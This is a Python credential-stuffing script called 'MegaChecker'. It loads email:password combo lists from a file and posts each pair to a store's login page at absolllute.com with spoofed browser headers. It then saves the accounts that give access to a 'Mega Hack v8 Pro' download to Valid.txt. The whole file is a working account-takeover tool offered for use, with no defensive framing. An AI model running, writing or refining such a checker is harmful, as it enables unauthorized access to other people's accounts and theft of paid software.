from colorama import Fore
import requests
import fade
import os

ascii_art = """
 __  __                ___ _           _   
|  \/  |___ __ _ __ _ / __| |_  ___ __| |__
| |\/| / -_) _` / _` | (__| ' \/ -_) _| / /
|_|  |_\___\__, \__,_|\___|_||_\___\__|_\_
           |___/      
"""

color = fade.purplepink(ascii_art)

login_link = "https://absolllute.com/store/login"

headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://absolllute.com/store/login",
    "Sec-Ch-Ua": '"Not(A:Brand";v="99", "Brave";v="133", "Chromium";v="133"',
    "Sec-Ch-Ua-Mobile": '"Android"'
}
os.system("cls || clear")
print(color)
choice = input("1 - Checking, 2 - Quit --> ")

if not os.path.exists("combo.txt"):
    with open("combo.txt", "w") as f:
        print("Combo TXT File created, rerun program")

if not os.path.exists("Valid.txt"):
    with open("Valid.txt", "w") as f:
        print("Valid TXT File created, rerun program")

if choice == "1":
 with open("combo.txt", "r") as f:
     for line in f:
         line = line.strip()

         if ":" not in line:
             print("Skipping invalid line:", line)
             continue

         email, passw = line.split(":", 1)
         payload = {"e": email, "p": passw}

         response = requests.post(login_link, headers=headers, data=payload)

         if "Invalid password" in response.text or "Invalid email" in response.text:
             print(Fore.RED + "[-]", Fore.WHITE + f"{email}:{passw}", "--> Bad")
         elif "Download Mega Hack v8 Pro" in response.text:
             print(Fore.GREEN + "[+]", Fore.MAGENTA + f"{email}:{passw}", "--> MegaHack available")
             with open("Valid.txt", "a") as f:
                 f.write(f"{email}:{passw}\n")
         elif "Buy Mega Hack v8 Pro" in response.text:
             print(Fore.RED + "[-]", Fore.WHITE + f"{email}:{passw}", "--> No MegaHack")

elif choice == "2":
 print("Quitting the program.")
 quit()
